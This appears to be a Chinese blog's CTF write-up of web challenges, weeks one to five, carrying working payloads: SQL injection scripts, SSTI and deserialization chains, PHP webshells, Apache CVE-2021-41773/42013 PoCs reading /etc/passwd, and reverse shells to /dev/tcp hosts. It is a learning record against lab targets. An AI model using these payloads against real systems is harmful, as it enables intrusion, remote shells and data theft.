+<h3 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head?Header!"></a>Head?Header!</h3><p>根据提示一步一步修改header头内容：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210051911192.png" alt="WEEK1-HEADER"></p>
+<p>payload:</p>
+<pre><code class="http">User-Agent: CTF
+Referer: ctf.com
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+<h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h3><p>在<code>robots.txt</code>中找到Part One: <code>flag&#123;Th1s_Is_s00</code></p>
+<p>在<code>.index.php.swp</code>中找到Part two:<code>0_e4sy_d0_y00</code></p>
+<p>在<code>www.zip</code>中找到Part Three: <code>u_th1nk_so?&#125;</code></p>
+<p>拼接一下获得flag</p>
+<h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h3><p>第一层绕过<code>file_get_contents</code>：利用<code>data://</code>伪协议绕过</p>
+<p>第二层绕过MD5弱比较：利用数组绕过</p>
+<p>第三层绕过intval：在数字后加字母</p>
+<p>第四层绕过注释符#：加换行符%0a</p>
+<p>完整payload：</p>
+<pre><code class="http">GET:
+data=data://text/plain,Welcome%20to%20CTF&amp;key1[]=1&amp;key2[]=2&amp;cmd=%0asystem(&#39;cat%20/f*&#39;);
+POST:
+name=2077a
+</code></pre>
+<h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>直接在留言查询页面输入万能密码<code>1&#39;or 1=1--+</code>就都查出来了，随手一试……</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210051940672.png" alt="WEEK1-Word-For-You"></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210081204057.png" alt="WEEK1-Word-For-You"></p>
+<pre><code>flag: flag&#123;Th1s_is_0_simp1e_S0L_test&#125;    
+</code></pre>
+<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h3><p>week1的升级版，只显示查询成功不显示内容了，如果留言不存在就不会显示查询成功，看来是用了布尔盲注，写个脚本：</p>
+<pre><code class="php">import requests
+import time
+
+if __name__ == &#39;__main__&#39; :
+    url = &#39;http://7c599b1b-ed36-4f74-9ef736604685e43.node4.buuoj.cn:81/comments.php&#39;
+    result = &#39;&#39;
+    i = 0
+    while True:
+        i = i + 1
+        low = 32
+        high = 128
+        while low &lt; high:
+            mid = (low + high) // 2
+            payload = f&quot;1&#39; or ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;-- -&quot;
+            #payload = f&quot;1&#39; or(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)-- -&quot;
+            #payload = f&quot;1&#39; or(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)-- -&quot;
+            #payload = f&quot;1&#39; or (ascii(substr((select text from wfy_comments limit 11,1),&#123;i&#125;,1))&gt;&#123;mid&#125;)-- -&quot;
+            data = &#123;
+                &quot;name&quot;: payload
+            &#125;
+            r=requests.post(url=url,data=data)
+            r.encoding=&quot;utf-8&quot;
+            #print(r.text)
+            if &#39;啊呜&#39; in r.text:
+                high = mid
+            else:
+                low = mid + 1
+            time.sleep(0.2)
+        if low!=32:
+            result += chr(low)
+            print(result)
+        else:
+            break
+    print(result)
+</code></pre>
+<p>这里有个小坑点就是，留言中的大部分内容都是中文的，不好用ascii码比较的情况爆破出所有的留言内容，但是我们可以用limit限制只爆破flag的那条留言的值，返回week1中的sql题看了一下flag是第十二条留言，因此就限制到<code>limit 11,1</code>爆破出flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210052021460.png" alt="WEEK2-Word-For-You(2 Gen)"></p>
+<h3 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h3><p>绕过第一层伪随机数，利用现成脚本爆破出随机数种子：<code>1145146</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210062322721.png" alt="(WEEK2 IncludeOne)"></p>
+<p>本地写个脚本得出guess的值：<code>1202031004</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210052030697.png" alt="(WEEK2 IncludeOne)"></p>
+<p>绕过第二层include，要求必须有NewStar且不能出现<code>base</code>和<code>..</code>,利用php:&#x2F;&#x2F;filter伪协议rot13编码实现绕过，最终payload为：</p>
+<pre><code>POST: guess=1202031004
+GET: /?file=php://filter/string.rot13/newstar/resource=flag.php
+</code></pre>
+<p>F12在注释中找到rot13编码后的字符串，解码一下得到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210052040102.png" alt="(WEEK2 IncludeOne)"></p>
+<h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><p>完整的poc链为：</p>
+<pre><code>Start::__destruct() -&gt; Sec::__toString() -&gt; Easy::__call() -&gt; eeee::__clone() -&gt; Start::__isset() -&gt; Sec::__invoke()
+</code></pre>
+<p>附上脚本：</p>
+<pre><code class="php">&lt;?php
+class Start&#123;
+    public $name;
+    protected $func;
+    public function __construct()&#123;
+        $this-&gt;func=new Sec();
+        $this-&gt;name=new Sec();
+    &#125;
+&#125;
+class Sec&#123;
+    private $obj;
+    public $var;
+    public function __construct()&#123;
+        $this-&gt;obj=new Easy();
+    &#125;
+&#125;
+class Easy&#123;
+    public $cla;
+&#125;
+class eeee&#123;
+    public $obj;
+&#125;
+$c=new eeee();
+$a=new Start();
+$c-&gt;obj=$a;
+$b=new Sec();
+$b-&gt;var=$c;
+$a-&gt;name=$b;
+echo urlencode(serialize($c));
+</code></pre>
+<p>注意虽然poc链是从Start开始，但利用eeee先进去也可以触发Start的__destruct()方法</p>
+<h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><p><code>www.zip</code>源码泄露，考到了graphql，ok完全没听说过，查资料找博客，看到了这篇文章：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a><br>大致了解了graphql的特性后，尝试了一下内省查询，啥也没出来，在源码里找到flag的接口，按照输出id的格式写了一下：</p>
+<pre><code class="http">payload:id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\nffffllllaaagggg_1n_h3r3_flag &#123;\nflag\n&#125;\n&#125;\n&quot;&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210081205742.png" alt="(WEEK2 ezAPI)"></p>
+<h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>非常简单的SSTI模板注入，浅试了一下init和cat被过滤了，利用字符串拼接和中括号绕过，最终payload为：</p>
+<pre><code>GET: ?name=&#123;&#123;self['__in'+'it__'].__globals__.__builtins__['__import__']('os').popen('tac /f*').read()&#125;&#125;
+</code></pre>
+<h3 id="multiSQL"><a href="#multiSQL" class="headerlink" title="multiSQL"></a>multiSQL</h3><p>根据题目翻译考的是联合注入，试了一下果然可以，题目要求把火华师傅的四级成绩改到425分以上，发现<code>select,update,insert</code> 都被过滤了，这里我们可以利用<code>replace into</code>进行数据修改,再利用<code>delete</code>删除原数据：</p>
+<pre><code class="sql">POST: 
+username=%E7%81%AB%E5%8D%8E&#39;;show tables;#查数据库里所有的表
+username=%E7%81%AB%E5%8D%8E&#39;;desc score;#查score表中所有字段
+username=%E7%81%AB%E5%8D%8E&#39;;replace into score values(&quot;火华&quot;,200,200,200);#表中插入一条数据
+username=%E7%81%AB%E5%8D%8E&#39;;delete from score where listen=11;#删除原本的数据
+</code></pre>
+<p>操作完以后，点击验证数据就可以拿到flag，复现的时候注意中文符号以及不要重复多次执行sql语句，有可能有奇奇怪怪的错误。</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210062231724.png" alt="(WEEK3 multiSQL)"></p>
+<h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>涉及知识盲区了，给出了hint才做出，具体我是按照<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iwantflag/p/15602747.html">https://www.cnblogs.com/iwantflag/p/15602747.html</a> 这篇博客写的。具体原理就是利用pearcmd.php来实现文件包含</p>
+<p>详细内容不多说移步上面师傅的博客，下面放出payload:</p>
+<pre><code class="php">GET: /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1])?&gt;+/tmp/hello.php
+#在hello.php文件中RCE
+GET: /index.php?&amp;file=/tmp/hello
+POST: 1=system(&#39;cat /f*&#39;);
+</code></pre>
+<p>注：用burpsuite传GET，用hackbar会被url编码传入文件无法解析</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210062255164.png" alt="(WEEK3 IncludeTwo)"></p>
+<h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><p>题目提示提交用户名，提交完了就输出名字啥也没有，看看有没有备份文件，结果有报错显示是thinkphp5.1.41版本的，又看了眼cookie像是base64编码后又url编码的，解码一下果然，网上搜了一下该版本的cve，具体讲解看这位师傅博客<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.html</a></p>
+<p>exp：</p>
+<pre><code class="php">&lt;?php
+namespace think;
+abstract class Model&#123;
+protected $append = [];
+private $data = [];
+function __construct()&#123;
+$this-&gt;append = [&quot;ethan&quot;=&gt;[&quot;dir&quot;,&quot;calc&quot;]];
+$this-&gt;data = [&quot;ethan&quot;=&gt;new Request()];
+&#125;
+&#125;
+class Request
+&#123;
+protected $hook = [];
+protected $filter = &quot;system&quot;;
+protected $config = [
+// 表单请求类型伪装变量
+&#39;var_method&#39;       =&gt; &#39;_method&#39;,
+// 表单ajax伪装变量
+&#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
+// 表单pjax伪装变量
+&#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
+// PATHINFO变量名 用于兼容模式
+&#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
+// 兼容PATH_INFO获取
+&#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
+// 默认全局过滤方法 用逗号分隔多个
+&#39;default_filter&#39;   =&gt; &#39;&#39;,
+// 域名根，如thinkphp.cn
+&#39;url_domain_root&#39;  =&gt; &#39;&#39;,
+// HTTPS代理标识
+&#39;https_agent_name&#39; =&gt; &#39;&#39;,
+// IP代理获取标识
+&#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
+// URL伪静态后缀
+&#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
+];
+function __construct()&#123;
+$this-&gt;filter = &quot;system&quot;;
+$this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];
+$this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
+&#125;
+&#125;
+namespace think\process\pipes;
+​
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+&#123;
+private $files = [];
+​
+public function __construct()
+&#123;
+$this-&gt;files=[new Pivot()];
+&#125;
+&#125;
+namespace think\model;
+​
+use think\Model;
+​
+class Pivot extends Model
+&#123;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+/*TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=*/
+?&gt;
+</code></pre>
+<p>将脚本结果放到cookie中，随便GET传个参数进行RCE：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210062308762.png" alt="image-20221006230816965"></p>
+<p>flag在env中</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210062308388.png" alt="image-20221006230844664"></p>
+<h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h3><p>这回的过滤关键词蛮多的，<code>init，globals，builtins，popen，空格，加号，cat</code>都给过滤了，不过无伤大雅，关键词过滤了可以用中括号和字符串拼接，加号过滤了可以直接省去效果相同，空格过滤了可以${IFS}替代，还是那个payload，稍微修改一下拿来就能用</p>
+<pre><code>GET: ?name=&#123;&#123;self['__in''it__']['__glo''bals__']['__bui''ltins__']['__import__']('os')['pop''en']('tac$&#123;IFS&#125;/f*').read()&#125;&#125;
+</code></pre>
+<p>轻松拿下flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210101027196.png" alt="(WEEK4 BabySSTI_Two)"></p>
+<h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p>这题困扰了我好久，我拿源码在我的vps跑我的payload是能出的，但是这个题就不行，最后还是换了个方法。过滤了很多关键字，但可以用<code>ls,cd,rev,..,&amp;&amp;,？</code>等等来实现RCE,payload为</p>
+<pre><code>GET: /?cmd=cd$&#123;IFS&#125;..$&#123;IFS&#125;%26%26$&#123;IFS&#125;cd$&#123;IFS&#125;..%26%26$&#123;IFS&#125;cd$&#123;IFS&#125;..%26%26rev$&#123;IFS&#125;fff?llllaaaaggggg
+</code></pre>
+<p>得到逆序后的flag，随便跑个逆序字符串的脚本获得flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210112036030.png" alt="WEEK4-So Baby RCE"></p>
+<p>这里注意<code>&amp;</code>符号在GET中有其他作用，需要进行url编码后使用。原本我的payload的是打算利用环境变量来构造<code>/</code>来实现RCE，具体做法为</p>
+<pre><code>$&#123;PWD:0:1&#125; =&gt; &#39;/&#39;
+</code></pre>
+<p>可能因为环境不太一样，就是构造不出来，还是太菜了。</p>
+<h3 id="UnserialieThree"><a href="#UnserialieThree" class="headerlink" title="UnserialieThree"></a>UnserialieThree</h3><p><code>F12</code>页面审查发现提示<code>class.php</code>中有内容，访问一下查看源码：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+class Evil&#123;
+    public $cmd;
+    public function __destruct()
+    &#123;
+        if(!preg_match(&quot;/&gt;|&lt;|\?|php|&quot;.urldecode(&quot;%0a&quot;).&quot;/i&quot;,$this-&gt;cmd))&#123;
+            //Same point ,can you bypass me again?
+            eval(&quot;#&quot;.$this-&gt;cmd);
+        &#125;else&#123;
+            echo &quot;No!&quot;;
+        &#125;
+    &#125;
+&#125;
+
+file_exists($_GET[&#39;file&#39;]);
+</code></pre>
+<p>又是文件上传又是反序列化很容易想到phar反序列化，解出这道题的关键就是如何绕过eval里面的注释符。回车符被过滤了可以考虑换行符<code>%0d</code>，还听一个师傅说用<code>\r</code>也可以但我太菜没复现出来，然后就跑一个生成phar格式的脚本:</p>
+<pre><code class="php">&lt;?php
+#要把php.ini中的phar.readonly设置成Off，不然无法生成phar文件
+
+class Evil &#123;
+    public $cmd;
+&#125;
+
+$a = new Evil();
+$a-&gt;cmd=urldecode(&quot;%0d&quot;).&quot;system(&#39;cat f*&#39;);&quot;;
+$phar = new Phar(&quot;aa.phar&quot;); //后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+$phar-&gt;setMetadata($a);//将自定义的meta-data存入manifest，且这部分是以序列化的形式存在
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件,因为phar相当于一个解压缩，前提就是要现有.phar文件，然后又因为meta-data是由序列化存储，这边添加一个压缩文件包，就是为了在用phar://伪协议的时候触发meta-data的反序列化
+$phar-&gt;stopBuffering();//签名自动计算
+?&gt;
+</code></pre>
+<p>这里注意%0d需要解码一下再拼接，获得phar文件后修改一下后缀为<code>.png</code>绕过后缀检查，上传后在class.php利用伪协议<code>phar://</code>读取文件触发反序列化</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210151735617.png" alt="WEEK4-UnserialieThree"></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210151735310.png" alt="WEEK4-UnserialieThree"></p>
+<h3 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h3><p>输入100回显说有<code>f1ag_is_here</code>的留言，然后输入1发现能查到有这个数据但不显示数据内容，试了一下<code>1^1</code>查不到，<code>1^0</code>回显与1相同，找到注入点直接开始盲注，脚本如下：</p>
+<pre><code class="python">import requests
+import time
+
+if __name__ == &#39;__main__&#39; :
+    url = &#39;http://abfb87c2-4829-4181-be2f-0e2a0a3df3ec.node4.buuoj.cn:81/comments.php&#39;
+    result = &#39;&#39;
+    i = 0
+    while True:
+        i = i + 1
+        low = 32
+        high = 128
+        while low &lt; high:
+            mid = (low + high) // 2
+            #payload = f&quot;1^(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;
+            #payload = f&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;)+&#39;0&quot;
+            #payload = f&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;
+            #payload = f&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;
+            payload = f&quot;1^(ascii(substr((select(text)from(wfy_comments)where(user=&#39;f1ag_is_here&#39;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;
+            data = &#123;
+                &quot;name&quot;: payload
+            &#125;
+            r=requests.post(url=url,data=data)
+            r.encoding=&quot;utf-8&quot;
+            print(payload)
+            if &#39;耶&#39; in r.text:
+                high = mid
+            else:
+                low = mid + 1
+            time.sleep(0.2)
+        if low!=32:
+            result += chr(low)
+            print(result)
+        else:
+            break
+    print(result)
+</code></pre>
+<p>这里需要注意一下空格过滤了，拿小括号分割一下，因为前面提示了flag在<code>f1ag_is_here</code>里，查询到<code>wfy_comments</code>表中字段有<code>id，user，name，text</code>，flag肯定在text字段中，然后试一试<code>f1ag_is_here</code>是<code>user</code>字段的内容还是<code>name</code>字段的内容，用<code>where</code>限定一下，还是那个问题可能有中文字符盲注不好全跑出来。</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210151555349.png" alt="WEEK4-又一个SQL"></p>
+<h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><p>拿到源码放到<code>jd-gui</code>中查看</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018200736343.png" alt="image-20221018200736343"></p>
+<p>根据题目可知是ROME反序列化，用现成的工具<code>ysoserial</code>生成<code>payload</code></p>
+<pre><code class="bash">java -jar ysoserial-master.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC95b3VyLXZwcy8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018201346680.png" alt="image-20221018201346680"></p>
+<p>将payload中的回车符删掉，再url编码一下</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018201438832.png" alt="image-20221018201438832"></p>
+<p>在服务器上nc监听端口，<code>POST</code>传参数<code>EXP</code>反弹到服务器上getshell</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018203140129.png" alt="image-20221018203140129"></p>
+<h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h3><p>随便上传一个照片正常显示，改成php结尾会报错，看来对php文件有过滤，根据报错页面知道这是一个apache服务的靶机，尝试上传<code>.htaccess</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171508123.png" alt=".htaccess文件内容"></p>
+<p>将文件名改为<code>.htaccess.png</code>上传，<code>burpsuite</code>抓包去掉后缀</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171517251.png" alt="Give me your photo PLZ"></p>
+<p>之后再随便传个一句话木马，保存为png格式就可以getshell了</p>
+<pre><code class="php">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;//保存为1.png
+</code></pre>
+<p>网页访问<code>/upload/1.png</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171522016.png" alt="Give me your photo PLZ"></p>
+<p>看到这句话后我真的泪目了~~在env中找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171523696.png" alt="image-20221017152333215"></p>
+<h3 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h3><p>相比之前的题过滤了下划线<code>_</code>,这里我们可以用十六进制编码绕过，完整payload：</p>
+<pre><code class="python">GET: ?name=&#123;&#123;self['\x5f\x5fin''it\x5f\x5f']['\x5f\x5fglo''bals\x5f\x5f']['\x5f\x5fbui''ltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['pop''en']('tac$&#123;IFS&#125;/f*').read()&#125;&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171501063.png" alt="BabySSTI_Three"></p>
+<h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><p> <code>CVE-2021-41773</code> </p>
+<p>影响版本：<code>Apache 2.4.49</code></p>
+<p>poc:</p>
+<pre><code class="url">curl -v --path-as-is http://192.168.190.134:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+curl -v --data &quot;echo;id&quot; &#39;http://192.168.190.134:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;
+
+curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; bash -i &gt;&amp; /dev/tcp/192.168.190.146/8888 0&gt;&amp;1&#39; &quot;http://192.168.190.134:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;
+</code></pre>
+<p><code>CVE-2021-42013</code></p>
+<p>影响版本：<code>Apache 2.4.49 和 Apache 2.4.50</code></p>
+<p>poc:</p>
+<pre><code>curl -v --path-as-is http://192.168.190.134:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+
+curl -v --data &quot;echo;id&quot; &#39;http://192.168.190.134:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39;
+
+curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; whoami&#39; &quot;http://192.168.190.134:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&quot;
+</code></pre>
+<p>这里用<code>wappalyzer</code>插件看一下apache的版本为<code>Apache 2.4.50</code>，用<code>CVE-2021-42013</code>的poc打</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171954702.png" alt="image-20221017195441225"></p>
+<p>执行 <code>curl -v --data &quot;echo;cat /f*&quot; &#39;http://node4.buuoj.cn:26822/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39;</code></p>
+<p>拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202210171958579.png" alt="image-20221017195832990"></p>
+<h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><pre><code class="php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&quot;cmd&quot;]))&#123;
+    if(preg_match(&#39;/bash|curl/i&#39;,$_GET[&quot;cmd&quot;]))&#123;
+        echo &quot;Hacker!&quot;;
+    &#125;else&#123;
+        shell_exec($_GET[&quot;cmd&quot;]);
+    &#125;
+&#125;else&#123;
+    show_source(__FILE__);
+&#125;
+</code></pre>
+<p>把<code>bash</code>和<code>curl</code>过滤了，试了一下<code>nc</code>命令也没有反应，看来反弹shell这条路行不通，于是就利用写文件来看</p>
+<pre><code class="php">GET: ?cmd=echo &quot;&lt;?php eval(\$_POST[cmd]);?&gt;&quot; &gt;1.php
+</code></pre>
+<p>直接写个一句话木马到文件里，注意对<code>$</code>的转义</p>
+<p>利用蚁剑连接</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018203939242.png" alt="image-20221018203939242"></p>
+<p>在根目录里发现flag但是空的,我们进入终端执行命令：</p>
+<pre><code class="bash">ls / -al
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018204150803.png" alt="image-20221018204150803"></p>
+<p>发现权限不够，利用find寻找可以利用的函数：</p>
+<pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018204406047.png" alt="image-20221018204406047"></p>
+<p>蚁剑里出不来不知道为什么，返回页面执行一下，发现有<code>date</code>可用</p>
+<p>用命令<code>date -f /f*</code>读到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20221018204611177.png" alt="image-20221018204611177"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
+        <script type="text/javascript">
+			(function(d, s) {
+				var j, e = d.getElementsByTagName(s)[0];
+
+				if (typeof LivereTower === 'function') { return; }
+
+				j = d.createElement(s);
+				window.livereOptions = {
+					eagerLoading: true,
+					scrollEventTargetSelector: '#post'
+                }
+				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+				j.async = true;
+				e.parentNode.insertBefore(j, e);
+			})(document, 'script');
+        </script>
+        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 ttycp3
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+    
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+    
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
